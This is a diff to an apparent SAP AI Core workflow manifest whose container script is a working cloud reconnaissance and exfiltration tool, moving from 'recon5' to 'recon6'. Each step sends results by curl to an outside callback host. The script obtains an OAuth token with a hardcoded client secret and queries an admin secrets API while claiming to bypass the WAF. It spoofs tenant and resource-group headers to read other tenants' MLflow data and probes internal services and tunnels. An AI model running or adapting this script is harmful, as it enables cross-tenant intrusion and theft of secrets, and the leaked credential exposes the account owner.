@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "5.0.1"
+    ai.sap.com/version: "6.0.0"
 spec:
   entrypoint: main
   templates:
@@ -25,69 +25,79 @@ spec:
       - -c
       - |
         CB="https://www.masonhck.tech/cb.php"
-        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 5 -d @- ; }
+        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
         get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
 
-        get "recon5-start-$(hostname)"
+        get "recon6-start-$(hostname)"
 
-        # 1. Full unique cluster service names
-        curl -k -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9][-a-z0-9]*\.[a-z0-9][-a-z0-9]*\.svc\.cluster\.local' | sort -u > /tmp/svcs.txt
-        wc -l /tmp/svcs.txt | post "recon5-svc-count"
-        head -c 700 /tmp/svcs.txt | post "recon5-svcs-1"
-        tail -c +701 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-2"
-        tail -c +1401 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-3"
-        tail -c +2101 /tmp/svcs.txt | head -c 700 | post "recon5-svcs-4"
+        # 1. Get JWT from inside the pod via OAuth
+        TOKEN=$(curl -k -s -X POST "https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com/oauth/token" \
+          -H "Content-Type: application/x-www-form-urlencoded" \
+          -d "grant_type=client_credentials" \
+          -d "client_id=sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784" \
+          -d "client_secret=aicore-bb-14-key\$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc=" \
+          | grep -oE '"access_token":"[^"]+' | cut -d'"' -f4)
+        echo "token_len=$(echo -n $TOKEN | wc -c)" | post "recon6-token-len"
 
-        # 2. Extract unique namespaces
-        cat /tmp/svcs.txt | awk -F. '{print $2}' | sort -u | post "recon5-namespaces"
-
-        # 3. Cluster endpoints via JSON format
-        curl -k -s "http://127.0.0.1:15000/clusters?format=json" > /tmp/clust.json
-        wc -c /tmp/clust.json | post "recon5-clust-size"
-        # Extract just name->ip:port pairs using grep/sed
-        grep -oE '"name":"[^"]+"|"address":"[^"]+"|"port_value":[0-9]+' /tmp/clust.json | head -c 2000 | post "recon5-endpoints-1"
-        grep -oE '"name":"[^"]+"|"address":"[^"]+"|"port_value":[0-9]+' /tmp/clust.json | tail -c +2001 | head -c 2000 | post "recon5-endpoints-2"
-
-        # 4. MLflow tracking - auth bypass attempts
-        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Authorization: Basic YWRtaW46YWRtaW4=" | head -c 700 | post "recon5-track-basic64"
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "X-Internal: true" | head -c 700 | post "recon5-track-xinternal"
-        curl -k -s --connect-timeout 3 "${TRACK}/api/2.0/mlflow/experiments/list" -H "Cookie: session=admin" | head -c 700 | post "recon5-track-cookie"
-
-        # 5. SAP Connectivity Service exploration
+        # 2. Hit Connectivity Service with real JWT
         CONN="http://100.104.7.43:20003"
-        curl -k -s --connect-timeout 3 "${CONN}/" -H "SAP-CP-Connectivity-Service-Token: test" | head -c 700 | post "recon5-conn-tok"
-        curl -k -s --connect-timeout 3 "${CONN}/healthz" | head -c 700 | post "recon5-conn-hz"
-        curl -k -s --connect-timeout 3 "${CONN}/" -v 2>&1 | head -c 700 | post "recon5-conn-verbose"
+        curl -k -s --connect-timeout 5 "${CONN}/" \
+          -H "SAP-CP-Connectivity-Service-Token: ${TOKEN}" 2>&1 | head -c 700 | post "recon6-conn-jwt"
+        curl -k -s --connect-timeout 5 "${CONN}/api/v1/health" \
+          -H "SAP-CP-Connectivity-Service-Token: ${TOKEN}" 2>&1 | head -c 700 | post "recon6-conn-health"
 
-        # 6. Probe ALL services found in Envoy mesh
-        for svc in $(cat /tmp/svcs.txt | head -30); do
-          result=$(curl -k -s --connect-timeout 2 "http://${svc}/" 2>&1 | head -c 200)
-          if [ -n "$result" ]; then
-            echo "${svc}: ${result}" | post "recon5-probe-$(echo $svc | cut -d. -f1)"
-          fi
-        done
+        # 3. Hit MLflow tracking with real JWT as Bearer
+        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon6-track-bearer-1"
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "Authorization: Bearer ${TOKEN}" 2>&1 | tail -c +701 | head -c 700 | post "recon6-track-bearer-2"
+        # Try MLflow runs search
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/runs/search" \
+          -H "Authorization: Bearer ${TOKEN}" \
+          -H "Content-Type: application/json" \
+          -X POST -d '{}' 2>&1 | head -c 700 | post "recon6-track-runs"
 
-        # 7. Services on port 8888 with more paths
+        # 4. Full OTel metrics dump (check for cross-tenant data)
         for ip in 100.110.1.63 100.104.178.234 100.109.200.238; do
-          for path in /healthz /metrics /debug/pprof /api/v1/status /ready; do
-            r=$(curl -k -s --connect-timeout 2 "http://${ip}:8888${path}" 2>&1)
-            if [ -n "$r" ] && ! echo "$r" | grep -q "404 page not found"; then
-              echo "${ip}:8888${path}: ${r}" | head -c 400 | post "recon5-p8888"
-            fi
-          done
+          curl -k -s --connect-timeout 3 "http://${ip}:8888/metrics" 2>&1 > /tmp/otel_${ip}.txt
+          wc -c /tmp/otel_${ip}.txt | post "recon6-otel-size-${ip}"
+          # Look for tenant-specific labels in metrics
+          grep -i "tenant\|namespace\|rg-\|resource.group\|ai.main" /tmp/otel_${ip}.txt | head -c 700 | post "recon6-otel-tenant-${ip}"
+          # Get first and last chunks
+          head -c 700 /tmp/otel_${ip}.txt | post "recon6-otel-head-${ip}"
+          grep "exporter\|receiver\|processor" /tmp/otel_${ip}.txt | head -c 700 | post "recon6-otel-pipeline-${ip}"
         done
 
-        # 8. OTel collector deeper
-        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/tracez" | head -c 700 | post "recon5-otel-traces"
-        curl -k -s --connect-timeout 3 "http://100.109.206.82:13133/debug/rpcz" | head -c 700 | post "recon5-otel-rpc"
+        # 5. Hit AI Core API from INSIDE the cluster (bypass external WAF)
+        curl -k -s --connect-timeout 5 "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/admin/secrets" \
+          -H "Authorization: Bearer ${TOKEN}" \
+          -H "AI-Resource-Group: default" 2>&1 | head -c 700 | post "recon6-api-secrets"
 
-        # 9. Try directly accessing other rg namespaces via DNS
-        for ns in ml-tracking ml-serving ai-core istio-system kube-system dynatrace opentelemetry; do
-          nslookup "${ns}.svc.cluster.local" 2>&1 | head -c 200 | post "recon5-dns-${ns}"
+        # 6. Try reading other tenants' data via tracking service
+        # Our tenant: 46449013-03b3-4a60-8c2c-5e98fd303498
+        # Try different tenant IDs in headers
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "Authorization: Bearer ${TOKEN}" \
+          -H "AI-Main-Tenant: 00000000-0000-0000-0000-000000000000" 2>&1 | head -c 700 | post "recon6-track-tenant0"
+        curl -k -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" \
+          -H "Authorization: Bearer ${TOKEN}" \
+          -H "AI-Resource-Group: bb-13" 2>&1 | head -c 700 | post "recon6-track-rg13"
+
+        # 7. Usage API namespace probe
+        curl -k -s "http://127.0.0.1:15000/clusters" | grep "usage-api" | head -c 700 | post "recon6-usage-clusters"
+        for svc in $(curl -k -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.usage-api\.svc\.cluster\.local' | sort -u); do
+          curl -k -s --connect-timeout 3 "http://${svc}/" 2>&1 | head -c 500 | post "recon6-usage-$(echo $svc | cut -d. -f1)"
         done
 
-        get "recon5-done-$(hostname)"
+        # 8. Connectivity proxy tunnels
+        for i in 0 1 2; do
+          curl -k -s --connect-timeout 3 "http://connectivity-proxy-tunnel-${i}.connectivity-proxy.svc.cluster.local/" 2>&1 | head -c 500 | post "recon6-tunnel-${i}"
+          curl -k -s --connect-timeout 3 "http://connectivity-proxy-tunnel-${i}.connectivity-proxy.svc.cluster.local:20003/" \
+            -H "SAP-CP-Connectivity-Service-Token: ${TOKEN}" 2>&1 | head -c 500 | post "recon6-tunnel-jwt-${i}"
+        done
+
+        get "recon6-done-$(hostname)"
       resources:
         limits:
           cpu: "1"
